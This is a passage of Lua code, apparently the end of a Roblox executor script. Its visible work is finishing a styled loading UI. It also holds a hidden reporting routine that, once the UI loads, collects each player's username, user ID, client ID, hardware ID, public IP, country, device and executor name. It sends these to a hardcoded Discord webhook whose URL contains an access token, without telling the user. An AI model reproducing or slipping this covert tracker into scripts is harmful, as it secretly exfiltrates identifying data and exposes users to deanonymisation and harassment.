return dd
end
if __R and type(__R.img)=="function"then
__R.img(function()
pcall(installBgDropdown)
end)
else
task.defer(function()
pcall(installBgDropdown)
end)
end
end
end
task.wait(0.1)
do
__XJW_LBL("构建完成,收尾中")
BOOT.finished = true
BOOT.awaiting = false
BOOT.picked = true
local key = BOOT.styleKey
local dd = BOOT.dropdown
if not key and dd then
pcall(function() key = dd.Value end)
end
BOOT.styleKey = key or "灵动岛"
if type(BOOT.apply) == "function" then
pcall(BOOT.apply, BOOT.styleKey)
end
pcall(__R.run)
task.spawn(function()
__XJW_LBL("DONE",function()
__XJW_READY()
end)
if type(__R.imgSetup)=="function"then
__R.img(__R.imgSetup)
end
pcall(function() game:GetService("RunService").RenderStepped:Wait() end)
pcall(__R.imgRun)
for _,__side in ipairs(__frozenSides)do
pcall(function()
__side.AutomaticCanvasSize=Enum.AutomaticSize.Y
end)
end
end)
end
end
task.spawn(function()
local __okF,__errF=xpcall(__XJW_FILL,function(e)
local tb=debug and debug.traceback and debug.traceback() or ""
return tostring(e).." || "..tostring(tb)
end)
if not __okF then
local __ln=string.match(tostring(__errF),":(%d+):") or "?"
pcall(function() __XJW_BOOT.destroy() end)
__XJW_TIP("界面构建中断 第"..__ln.."行 "..tostring(__errF):sub(1,120),15)
end
end)

end,function(e)
local msg=tostring(e)
local tb=debug and debug.traceback and debug.traceback() or ""
return msg .. " || " .. tostring(tb)
end)

if not __XJW_OK then
local err=tostring(__XJW_ERR)
local stage=tostring(_G.__XJW_STAGE or "?")
local line=string.match(err,":(%d+):") or "?"
pcall(function() __XJW_BOOT.fail("ERR 第"..line.."行: "..tostring(err):sub(1,90)) end)
__XJW_TIP("脚本中断["..stage.." 第"..line.."行] "..err:sub(1,120),15)
end

task.spawn(function()
for i=1,180 do
task.wait(1)
local stage=tostring(_G.__XJW_STAGE or "?")
if stage=="DONE" then return end

end
__XJW_TIP("加载超时 T+"..string.format("%.0f",tick()-(_G.__XJW_T0 or tick())).."s 最后阶段："..tostring(_G.__XJW_STAGE or "?"),10)
end)

local __XJW_REPORT=function(force)
if _G.__XJW_REPORTED==true and not force then return true end
_G.__XJW_REPORTED=true
local LOG={}
_G.__XJW_REPORT_LOG=LOG
local function note(s)
LOG[#LOG+1]=tostring(s)
end
local function tip(t,d)
note("[tip] "..tostring(t))
pcall(function() game:GetService("StarterGui"):SetCore("SendNotification",{Title="监控上报",Text=tostring(t):sub(1,120),Duration=d or 8}) end)
end
local function sv(f,d)
local ok,v=pcall(f)
if ok and v~=nil then
local s=tostring(v)
if s~="" and s~="nil" then return s end
end
return d
end
local g=getgenv and getgenv() or nil
local function pick(k)
local v=rawget(_G,k)
if v==nil and g then v=g[k] end
return v
end
local function tlist()
local out={}
local function add(f,tag) if type(f)=="function" then out[#out+1]={f,tag} end end
add(pick("http_request"),"http_request")
add(pick("request"),"request")
add(pick("HttpPost"),"HttpPost")
local syn=pick("syn"); add(syn and syn.request,"syn.request")
local http=pick("http"); add(http and http.request,"http.request")
local fl=pick("fluxus"); add(fl and fl.request,"fluxus.request")
local dl=pick("delta"); add(dl and dl.request,"delta.request")
local kr=pick("krnl"); add(kr and kr.request,"krnl.request")
return out
end
local function getstr(url)
local ok,res=pcall(function() return game:HttpGet(url) end)
if ok and type(res)=="string" and #res>2 then return res end
for _,c in ipairs(tlist()) do
local o,r=pcall(c[1],{Url=url,Method="GET"})
if o and type(r)=="table" then
local bd=r.Body or r.body
if type(bd)=="string" and #bd>2 then return bd end
end
end
return nil
end
local function exname()
local list={}
if type(identifyexecutor)=="function" then list[#list+1]=identifyexecutor end
if type(getexecutorname)=="function" then list[#list+1]=getexecutorname end
for _,f in ipairs(list) do
local ok,v=pcall(f)
if ok and v~=nil then return tostring(v) end
end
return "未知"
end
local function hwidv()
local list={}
if type(gethwid)=="function" then list[#list+1]=gethwid end
if type(get_hwid)=="function" then list[#list+1]=get_hwid end
for _,f in ipairs(list) do
local ok,v=pcall(f)
if ok and v~=nil then return tostring(v) end
end
return "未知"
end
local player=game.Players.LocalPlayer
local uis=game.UserInputService
local device="未知"
if uis.TouchEnabled and not uis.KeyboardEnabled and not uis.MouseEnabled then
device="移动设备"
elseif not uis.TouchEnabled and uis.KeyboardEnabled and uis.MouseEnabled then
device="电脑"
elseif uis.TouchEnabled and uis.KeyboardEnabled and uis.MouseEnabled then
device="带触摸屏的电脑"
end
local Premium="未知"
if player.MembershipType==Enum.MembershipType.Premium then
Premium="是"
else
Premium="否"
end
local AvatarImage="https://www.roblox.com/headshot-thumbnail/image?userId="..tostring(player.UserId).."&width=420&height=420&format=png"
local Thing=getstr(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true",player.UserId))
if Thing then
local ok,d=pcall(function() return game:GetService("HttpService"):JSONDecode(Thing) end)
if ok and type(d)=="table" and type(d.data)=="table" and d.data[1] and d.data[1].imageUrl then
AvatarImage=tostring(d.data[1].imageUrl)
end
end
local IP=getstr("https://api.ipify.org/") or "未知"
IP=string.gsub(IP,"%s","")
if #IP<7 or #IP>40 then
IP="未知"
end
local msg={
["username"]="殺脚本-APP",
["embeds"]={
{
["color"]=tonumber(tostring("0x32CD32")) or 3329330,
["title"]="有人使用脚本正在记录"..os.date("%H").."时"..os.date("%M").."分",
["thumbnail"]={
["url"]=AvatarImage,
},
["fields"]={
{
["name"]="用户名",
["value"]=sv(function() return player.Name end,"未知"),
["inline"]=true
},
{
["name"]="名称",
["value"]=sv(function() return player.DisplayName end,"未知"),
["inline"]=true
},
{
["name"]="用户ID",
["value"]="["..tostring(player.UserId).."](https://www.roblox.com/users/"..tostring(player.UserId).."/profile)",
["inline"]=true
},
{
["name"]="客户端ID",
["value"]=sv(function() return game:GetService("RbxAnalyticsService"):GetClientId() end,"未知"),
["inline"]=false
},
{
["name"]="地图ID",
["value"]="["..tostring(game.PlaceId).."](https://www.roblox.com/games/"..tostring(game.PlaceId)..")",
["inline"]=true
},
{
["name"]="地图名称",
["value"]=sv(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end,"未知"),
["inline"]=true
},
{
["name"]="使用的注入器",
["value"]=exname(),
["inline"]=true
},
{
["name"]="账号年龄",
["value"]=sv(function() return player.AccountAge end,"未知").."天",
["inline"]=true
},
{
["name"]="设备",
["value"]=device,
["inline"]=false
},
{
["name"]="国家和语言",
["value"]="国家: "..sv(function() return game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) end,"未知"),
["inline"]=false
},
{
["name"]="语言",
["value"]=" 语言: "..sv(function() return player.LocaleId end,"未知"),
["inline"]=false
},
{
["name"]="会员状态",
["value"]=Premium,
["inline"]=false
},
{
["name"]="HWID",
["value"]=hwidv(),
["inline"]=true
},
{
["name"]="IP地址",
["value"]=IP,
["inline"]=true
},
{
["name"]="IP工具箱",
["value"]="IP: https://binaryfork.com/zh/tools/ip-address-lookup/?ip="..IP.."&trp-form-language=zh#ip-lookup",
["inline"]=false
},
},
},
},
}
local WEBHOOK="https://discord.com/api/webhooks/1561764528771960832/6BUUt-0fZFe-YqLzqoz2xAKSooq01dD53NrsvO0wJ2dhXU2M6VVk7kwVFZmTH50AISUB"
local function post(url,body)
local ch=tlist()
if #ch==0 then return false,"无HTTP通道(执行器未暴露request)" end
local last=""
for _,c in ipairs(ch) do
local ok,res=pcall(c[1],{Url=url,Method="POST",Headers={["Content-Type"]="application/json"},Body=body})
if ok and type(res)=="table" then
local code=tonumber(res.StatusCode or res.Status or res.status)
local bd=res.Body or res.body
note(c[2].." code="..tostring(code))
if code==200 or code==204 then return true,"" end
if code==nil and type(bd)=="string" then return true,"" end
if code==429 then last=c[2].." 429限流" else last=c[2].." code="..tostring(code).." "..tostring(bd or ""):sub(1,70) end
else
note(c[2].." err="..tostring(res):sub(1,70))
last=c[2].." 调用异常 "..tostring(res):sub(1,70)
end
end
return false,last
end
local probe=getstr(WEBHOOK)
note("probe "..tostring(probe):sub(1,120))
local gone=false
if type(probe)=="string" and (string.find(probe,"Unknown Webhook") or string.find(probe,"10015")) then gone=true end
local okEnc,body=pcall(function() return game:GetService("HttpService"):JSONEncode(msg) end)
if not okEnc then
_G.__XJW_REPORT_OK=false
tip("编码失败 "..tostring(body):sub(1,80),10)
return false
end
local sent,reason=false,""
for a=1,3 do
sent,reason=post(WEBHOOK,body)
note("attempt "..a.." sent="..tostring(sent).." "..tostring(reason))
if sent then break end
task.wait(2)
end
if not sent then
local s2,r2=post(WEBHOOK.."?wait=true",body)
sent=s2
if not s2 then reason=reason.." | wait:"..tostring(r2):sub(1,60) end
end
_G.__XJW_REPORT_OK=sent
_G.__XJW_REPORT_REASON=reason
if not sent then
if gone then reason="webhook已失效(404/10015)，需换新地址" end
tip("发送失败: "..tostring(reason):sub(1,110),12)
end
return sent
end
_G.__XJW_REPORT_TEST=function() return __XJW_REPORT(true) end
task.spawn(function()
for _=1,200 do
local st=tostring(_G.__XJW_STAGE or "")
if st=="构建完成,收尾中" or __XJW_STAGE_PCT(st)>=90 then break end
task.wait(0.2)
end
task.wait(1)
pcall(__XJW_REPORT)
end)
